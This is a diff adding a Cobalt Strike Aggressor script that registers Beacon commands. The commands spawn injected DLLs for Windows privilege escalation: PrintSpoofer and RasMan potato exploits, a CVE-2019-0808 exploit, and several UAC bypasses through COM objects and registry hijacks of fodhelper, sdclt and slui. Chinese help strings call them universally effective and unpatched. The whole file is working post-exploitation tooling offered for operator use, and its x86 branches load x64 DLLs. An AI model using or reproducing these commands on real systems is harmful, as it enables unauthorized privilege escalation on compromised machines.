@@ -1,0 +1,168 @@
+alias test {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("test.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("test.dll");
+    }
+
+    bdllspawn($1, $archdll,$2, "test", 999999, false);
+}
+
+beacon_command_register("test", "测试dll，弹一个窗", "测试dll，弹一个窗");
+
+alias PipePotato {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("PrintSpoofer-x64.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("PrintSpoofer-x64.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "no", 999999, false);
+}
+
+beacon_command_register("PipePotato", "PrintSpoofer提权，推荐使用，后面跟要运行的exe全路径", "PrintSpoofer提权，后面跟要运行的exe全路径\n\n 使用说明:pipePotato c:\\a.exe");
+
+
+alias RasmanPotato {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("RasMan-x64.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("RasMan-x64.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("RasmanPotato", "RasmanPotato提权，后面跟要运行的exe全路径和利用模式", "PrintSpoofer提权，后面跟要运行的exe全路径\n\n 使用说明:pipePotato c:\\a.exe");
+
+
+alias CVE-2019-0808 {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("CVE-2019-0808-x64.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("CVE-2019-0808-x64.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("CVE-2019-0808", "CVE-2019-0808提权，后面跟要运行的exe全路径和利用模式", "CVE-2019-0808提权，后面跟要运行的exe全路径\n\n 使用说明:CVE-2019-0808 c:\\a.exe");
+
+
+alias BypassUAC-CMLuaUtil {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("BypassUAC-CMLuaUtil-x64.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("BypassUAC-CMLuaUtil-x64.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("BypassUAC-CMLuaUtil", "No.41,通过com组件CMLuaUtil进行bypassuac,该利用方式可以通杀", "通过com组件CMLuaUtil进行bypassuac,未被微软修复，后面跟要运行的exe全路径\n\n");
+
+
+alias BypassUAC-ShellRegMod {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("BypassUAC-ShellRegMod-x64.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("BypassUAC-ShellRegMod-x64.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("BypassUAC-ShellRegMod", "No.33,该利用方式可以通杀", "通过fodhelper和computerdefault使用注册表进行bypassuac,未被微软修复，后面跟要运行的exe全路径\n\n");
+
+
+alias BypassUAC-ShellRegMod2 {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("BypassUAC-ShellRegMod2-x64.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("BypassUAC-ShellRegMod2-x64.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("BypassUAC-ShellRegMod2", "No.61&53,注册表利用方式,该利用方式可以通杀", "通过slui和sdclt进行bypassuac,未被微软修复，后面跟要运行的exe全路径\n\n");
+
+
+alias BypassUAC-ShellRegMod3 {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("BypassUAC-ShellRegMod3-x64.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("BypassUAC-ShellRegMod3-x64.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("BypassUAC-ShellRegMod3", "No.70,注册表利用方式,该利用方式可以通杀", "和BypassUAC-ShellRegMod类似,未被微软修复，后面跟要运行的exe全路径\n\n");
+
+
+alias BypassUAC-DccwCOM {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("BypassUAC-DccwCOM-x64.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("BypassUAC-DccwCOM-x64.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("BypassUAC-DccwCOM", "No.43,com组件利用方式,该利用方式可以通杀", "未被微软修复，后面跟要运行的exe全路径\n\n");
+
+
+alias BypassUAC-test {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("UAC-1.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("UAC-1.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("BypassUAC-test", "test", "未被微软修复，后面跟要运行的exe全路径\n\n");
+
